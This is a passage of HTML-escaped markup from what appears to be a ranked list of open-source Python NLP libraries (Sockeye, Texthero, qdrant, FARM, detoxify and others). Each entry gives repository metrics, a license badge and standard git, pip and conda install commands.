16.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/explosion/sense2vec&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sense2vec&#34;&gt;PyPi&lt;/a&gt; (📥 4K / month · 📦 8 · ⏱️ 19.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sense2vec&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/sense2vec&#34;&gt;Conda&lt;/a&gt; (📥 25K · ⏱️ 14.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge sense2vec&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/awslabs/sockeye&#34;&gt;Sockeye&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 1.1K) - Sequence-to-sequence framework with a focus on Neural Machine.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1X&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/awslabs/sockeye&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 56 · 🔀 310 · 📥 14 · 📋 280 - 2% open · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/awslabs/sockeye&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sockeye&#34;&gt;PyPi&lt;/a&gt; (📥 1K / month · 📦 2 · ⏱️ 05.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sockeye&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jbesomi/texthero&#34;&gt;Texthero&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 2.5K · 💤) - Text preprocessing, representation and visualization from zero to.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jbesomi/texthero&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 18 · 🔀 210 · 📥 90 · 📋 140 - 55% open · ⏱️ 19.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/jbesomi/texthero&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/texthero&#34;&gt;PyPi&lt;/a&gt; (📥 20K / month · 📦 4 · ⏱️ 01.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install texthero&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/qdrant/qdrant&#34;&gt;qdrant&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 1.7K) - Qdrant - vector similarity search engine with extended filtering.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/qdrant/qdrant&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 24 · 🔀 92 · 📋 200 - 23% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/qdrant/qdrant&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepset-ai/FARM&#34;&gt;FARM&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 1.5K) - Fast &amp;amp; easy transfer learning for NLP. Harvesting language models.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/deepset-ai/FARM&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 37 · 🔀 220 · 📋 440 - 8% open · ⏱️ 25.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/deepset-ai/FARM&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/farm&#34;&gt;PyPi&lt;/a&gt; (📥 4K / month · 📦 2 · ⏱️ 10.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install farm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/farm&#34;&gt;Conda&lt;/a&gt; (📥 1.1K · ⏱️ 14.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge farm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/thunlp/OpenPrompt&#34;&gt;OpenPrompt&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 1.5K) - An Open-Source Framework for Prompt-Learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/thunlp/OpenPrompt&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 13 · 🔀 150 · 📦 9 · 📋 120 - 7% open · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/thunlp/OpenPrompt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/openprompt&#34;&gt;PyPi&lt;/a&gt; (📥 650 / month · ⏱️ 15.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install openprompt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/recognai/rubrix&#34;&gt;rubrix&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 1.1K) - Rubrix, open-source framework for data-centric NLP. Data annotation.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/recognai/rubrix&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 91 · 📋 570 - 12% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/recognai/rubrix&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/rubrix&#34;&gt;PyPi&lt;/a&gt; (📥 1.1K / month · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install rubrix&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/rubrix&#34;&gt;Conda&lt;/a&gt; (📥 1.4K · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge rubrix&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/unitaryai/detoxify&#34;&gt;detoxify&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 430) - Trained models &amp;amp; code to predict toxic comments on all 3 Jigsaw.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/unitaryai/detoxify&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 6 · 🔀 51 · 📥 44K · 📦 90 · 📋 34 - 50% open · ⏱️ 20.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/unitaryai/detoxify&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/detoxify&#34;&gt;PyPi&lt;/a&gt; (📥 14K / month · 📦 2 · ⏱️ 12.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install detoxify&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/anhaidgroup/deepmatcher&#34;&gt;DeepMatcher&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 4.2K · 💤) - Python package for performing Entity and Text Matching using.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/anhaidgroup/deepmatcher&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 7 · 🔀 1.6K · 📦 19 · 📋 83 - 73% open · ⏱️ 13.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/anhaidgroup/deepmatcher&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/deepmatcher&#34;&gt;PyPi&lt;/a&gt; (📥 840 / month · ⏱️ 13.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install deepmatcher&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/IntelLabs/nlp-architect&#34;&gt;NLP Architect&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 2.8K · 💤) - A model library for exploring state-of-the-art deep.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/IntelLabs/nlp-architect&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 37 · 🔀 440 · 📦 8 · 📋 130 - 15% open · ⏱️ 12.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/IntelLabs/nlp-architect&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/nlp-architect&#34;&gt;PyPi&lt;/a&gt; (📥 110 / month · ⏱️ 12.04.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install nlp-architect&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/bytedance/lightseq&#34;&gt;lightseq&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 2.1K) - LightSeq: A High Performance Library for Sequence Processing and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/bytedance/lightseq&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 9 · 🔀 220 · 📥 620 · 📋 180 - 54% open · ⏱️ 07.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/bytedance/lightseq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/lightseq&#34;&gt;PyPi&lt;/a&gt; (📥 790 / month · ⏱️ 26.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install lightseq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nyu-mll/jiant&#34;&gt;jiant&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 1.4K) - jiant is an nlp toolkit. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/nyu-mll/jiant&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 57 · 🔀 270 · 📦 2 · 📋 550 - 11% open · ⏱️ 31.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/nyu-mll/jiant&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/jiant&#34;&gt;PyPi&lt;/a&gt; (📥 57 / month · ⏱️ 10.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install jiant&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/IndicoDataSolutions/finetune&#34;&gt;finetune&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 660) - Scikit-learn style model finetuning for NLP. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3postzC&#34;&gt;MPL-2.0&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/IndicoDataSolutions/finetune&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 71 · 📦 9 · 📋 140 - 15% open · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/IndicoDataSolutions/finetune&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/finetune&#34;&gt;PyPi&lt;/a&gt; (📥 120 / month · 📦 2 · ⏱️ 20.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install finetune&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/RUCAIBox/TextBox&#34;&gt;TextBox&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 360) - TextBox is an open-source library for building text generation system. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/RUCAIBox/TextBox&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 14 · 🔀 64 · 📦 5 · 📋 20 - 15% open · ⏱️ 06.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/RUCAIBox/TextBox&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/textbox&#34;&gt;PyPi&lt;/a&gt; (📥 77 / month · ⏱️ 15.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install textbox&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/thunlp/OpenNRE&#34;&gt;OpenNRE&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 3.7K) - An Open-Source Package for Neural Relation Extraction (NRE). &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/thunlp/OpenNRE&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 10 · 🔀 940 · 📋 350 - 5% open · ⏱️ 06.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/thunlp/OpenNRE&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PKSHATechnology-Research/camphr&#34;&gt;Camphr&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 340 · 💤) - Camphr - NLP libary for creating pipeline components. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;spacy&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PKSHATechnology-Research/camphr&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 7 · 🔀 18 · 📋 28 - 7% open · ⏱️ 18.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PKSHATechnology-Research/camphr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/camphr&#34;&gt;PyPi&lt;/a&gt; (📥 190 / month · 📦 2 · ⏱️ 28.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install camphr&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pytorch/translate&#34;&gt;Translate&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 740) - Translate - a PyTorch Language Library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pytorch/translate&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 87 · 🔀 170 · 📋 93 - 70% open · ⏱️ 15.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pytorch/translate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pytorch-translate&#34;&gt;PyPi&lt;/a&gt; (📥 4 / month · ⏱️ 01.05.2018):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pytorch-translate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/vizseq&#34;&gt;VizSeq&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 400) - An Analysis Toolkit for Natural Language Generation (Translation,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/vizseq&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 3 · 🔀 47 · 📦 6 · 📋 16 - 43% open · ⏱️ 29.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/vizseq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/vizseq&#34;&gt;PyPi&lt;/a&gt; (📥 69 / month · ⏱️ 07.08.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install vizseq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 28 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/seatgeek/fuzzywuzzy&#34;&gt;fuzzywuzzy&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 8.7K · 💤) - Fuzzy String Matching in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2KucAZR&#34;&gt;❗️GPL-2.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/saffsd/langid.py&#34;&gt;langid&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 2K · 💀) - Stand-alone language identification system. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/aboSamoor/polyglot&#34;&gt;polyglot&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 2K · 💀) - Multilingual text (NLP) processing toolkit. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/vi3k6i5/flashtext&#34;&gt;flashtext&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 5.2K · 💀) - Extract Keywords from sentence or Replace keywords in sentences. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/minimaxir/textgenrnn&#34;&gt;textgenrnn&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 4.7K · 💀) - Easily train your own text-generating neural network of any.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mchaput/whoosh&#34;&gt;whoosh&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 230) - Pure-Python full-text search library. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=BSD-1-Clause&#34;&gt;❗️BSD-1-Clause&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/VKCOM/YouTokenToMe&#34;&gt;YouTokenToMe&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 800 · 💀) - Unsupervised text tokenizer focused on computational efficiency. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nipunsadvilkar/pySBD&#34;&gt;pySBD&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 440 · 💀) - pySBD (Python Sentence Boundary Disambiguation) is a rule-based sentence.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/asyml/texar&#34;&gt;Texar&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 2.3K · 💀) - Toolkit for Machine Learning, Natural Language Processing, and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Hironsan/anago&#34;&gt;anaGo&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 1.4K · 💀) - Bidirectional LSTM-CRF and ELMo for Named-Entity Recognition,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Delta-ML/delta&#34;&gt;DELTA&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 1.5K · 💀) - DELTA is a deep learning based natural language and speech.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/EricFillion/happy-transformer&#34;&gt;happy-transformer&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 290) - A package built on top of Hugging Faces transformers.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;huggingface&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Alir3z4/python-stop-words&#34;&gt;stop-words&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 140 · 💀) - Get list of common stop words in various languages in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Ki6an/fastT5&#34;&gt;fastT5&lt;/a&gt;&lt;/b&gt; (🥉20 